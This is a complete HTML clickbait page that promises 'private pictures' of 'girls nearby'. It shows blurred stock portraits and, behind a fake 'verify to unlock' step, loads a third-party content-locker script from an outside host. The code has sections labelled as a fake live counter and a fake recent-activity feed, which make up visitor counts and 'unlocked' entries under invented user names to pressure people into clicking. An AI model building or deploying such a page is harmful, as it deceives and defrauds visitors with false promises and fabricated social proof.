<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Unlock Private Pictures</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    .blurred { filter: blur(12px); transition: 0.3s ease-in-out; }
    .profile:hover .blurred { filter: blur(6px); }
    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-top: 4px solid #ec4899;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: auto;
    }
    @keyframes spin { 0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
    /* Mobile Fullscreen Modal */
    .modal {
      transition: transform 0.3s ease, opacity 0.3s ease;
    }
    .modal.hidden {
      transform: translateY(100%);
      opacity: 0;
    }
  </style>
</head>
<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
  <div class="max-w-6xl w-full p-4">
    <h1 class="text-3xl font-bold text-center mb-6">🔥 Girls Nearby Waiting For You 🔥</h1>

    <!-- Profile Grid -->
    <div id="profileGrid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4"></div>

    <p class="text-center text-gray-400 mt-6 text-sm">
      ⚠️ You must verify your age (18+) to view these private pictures.
    </p>
  </div>

  <!-- Modal -->
  <div id="lockerModal" class="modal hidden fixed inset-0 bg-black bg-opacity-90 backdrop-blur-sm flex items-center justify-center z-50">
    <div class="bg-gray-800 rounded-none md:rounded-2xl p-6 w-full h-full md:max-w-lg md:h-auto relative shadow-lg overflow-y-auto">
      <button onclick="closeModal()" class="absolute top-3 right-3 text-gray-400 hover:text-white text-3xl">&times;</button>
      <h2 class="text-xl font-bold text-center mb-4">🔒 Verify to Unlock</h2>
      
      <!-- Locker Area -->
      <div id="lockerContainer" class="text-center"></div>

      <!-- Fake Live Counter -->
      <div id="liveCounter" class="mt-6 text-center text-sm text-gray-300">
        👥 <span id="onlineUsers">37</span> users online now <br>
        ✅ <span id="unlockedUsers">12</span> just unlocked private pics
      </div>

      <!-- Recent Activity Feed -->
      <div id="activityFeed" class="mt-6 bg-gray-700 rounded-lg p-3 h-40 overflow-hidden text-xs text-gray-200 space-y-2">
        <div class="flex items-center space-x-2">
          <img src="https://randomuser.me/api/portraits/men/11.jpg" class="w-6 h-6 rounded-full">
          <span>🇺🇸 User_Alex unlocked 18+ pics 2 mins ago</span>
        </div>
        <div class="flex items-center space-x-2">
          <img src="https://randomuser.me/api/portraits/women/14.jpg" class="w-6 h-6 rounded-full">
          <span>🇬🇧 User_Sophia unlocked 18+ pics 4 mins ago</span>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Profile Images Array
    const profiles = [
      "https://randomuser.me/api/portraits/women/65.jpg",
      "https://randomuser.me/api/portraits/women/32.jpg",
      "https://randomuser.me/api/portraits/women/44.jpg",
      "https://randomuser.me/api/portraits/women/18.jpg",
      "https://randomuser.me/api/portraits/women/50.jpg",
      "https://randomuser.me/api/portraits/women/12.jpg",
      "https://randomuser.me/api/portraits/women/25.jpg",
      "https://randomuser.me/api/portraits/women/39.jpg"
    ];

    // Render Profile Grid
    const grid = document.getElementById("profileGrid");
    profiles.forEach(src => {
      const div = document.createElement("div");
      div.className = "profile relative";
      div.innerHTML = `
        <img src="${src}" class="w-full h-56 object-cover rounded-xl blurred">
        <div class="absolute inset-0 flex items-center justify-center">
          <button onclick="openModal()" class="bg-pink-600 px-3 py-1 rounded-lg text-sm">Unlock</button>
        </div>
      `;
      grid.appendChild(div);
    });

    // Modal Functions
    function openModal() {
      const modal = document.getElementById("lockerModal");
      modal.classList.remove("hidden");
      modal.style.transform = "translateY(0)";
      modal.style.opacity = "1";

      document.getElementById("lockerContainer").innerHTML = `
        <div id="loadingBox">
          <div class="spinner"></div>
          <p class="mt-3 text-sm text-gray-300">Loading verification system...</p>
        </div>
      `;

      let oldScript = document.getElementById("afmlock");
      if (oldScript) oldScript.remove();

      setTimeout(() => {
        document.getElementById("lockerContainer").innerHTML = "";
        let s = document.createElement("script");
        s.src = "https://hubverify.com/cl/clocker.php?id=68bb9ae35b16c"; // আপনার আসল লিংক
        s.id = "afmlock";
        document.getElementById("lockerContainer").appendChild(s);
      }, 3000);
    }

    function closeModal() {
      const modal = document.getElementById("lockerModal");
      modal.classList.add("hidden");
    }

    // Swipe Down to Close (Mobile)
    let startY = 0;
    const modal = document.getElementById("lockerModal");
    modal.addEventListener("touchstart", (e) => {
      startY = e.touches[0].clientY;
    });
    modal.addEventListener("touchend", (e) => {
      let endY = e.changedTouches[0].clientY;
      if (endY - startY > 100) { // swipe down 100px+
        closeModal();
      }
    });

    // Fake Live Counter
    let online = 37, unlocked = 12;
    setInterval(() => {
      online += (Math.random() > 0.5 ? 1 : -1);
      if (online < 20) online = 20;
      document.getElementById("onlineUsers").textContent = online;
      if (Math.random() > 0.7) {
        unlocked++;
        document.getElementById("unlockedUsers").textContent = unlocked;
      }
    }, 4000);

    // Fake Recent Activity
    const users = [
      {name: "Alex", img: "https://randomuser.me/api/portraits/men/11.jpg", flag: "🇺🇸"},
      {name: "Sophia", img: "https://randomuser.me/api/portraits/women/14.jpg", flag: "🇬🇧"},
      {name: "Emma", img: "https://randomuser.me/api/portraits/women/22.jpg", flag: "🇨🇦"},
      {name: "Liam", img: "https://randomuser.me/api/portraits/men/19.jpg", flag: "🇦🇺"},
      {name: "Olivia", img: "https://randomuser.me/api/portraits/women/30.jpg", flag: "🇳🇿"},
      {name: "Noah", img: "https://randomuser.me/api/portraits/men/28.jpg", flag: "🇩🇪"},
      {name: "Mia", img: "https://randomuser.me/api/portraits/women/36.jpg", flag: "🇫🇷"},
      {name: "James", img: "https://randomuser.me/api/portraits/men/44.jpg", flag: "🇮🇹"}
    ];

    function addActivity() {
      const user = users[Math.floor(Math.random() * users.length)];
      const minutes = Math.floor(Math.random() * 5) + 1;
      const feed = document.getElementById("activityFeed");
      const div = document.createElement("div");
      div.className = "flex items-center space-x-2";
      div.innerHTML = `
        <img src="${user.img}" class="w-6 h-6 rounded-full">
        <span>${user.flag} User_${user.name} unlocked 18+ pics ${minutes} mins ago</span>
      `;
      feed.prepend(div);
      if (feed.children.length > 6) feed.removeChild(feed.lastChild);
    }
    setInterval(addActivity, 5000);
  </script>
</body>
</html>
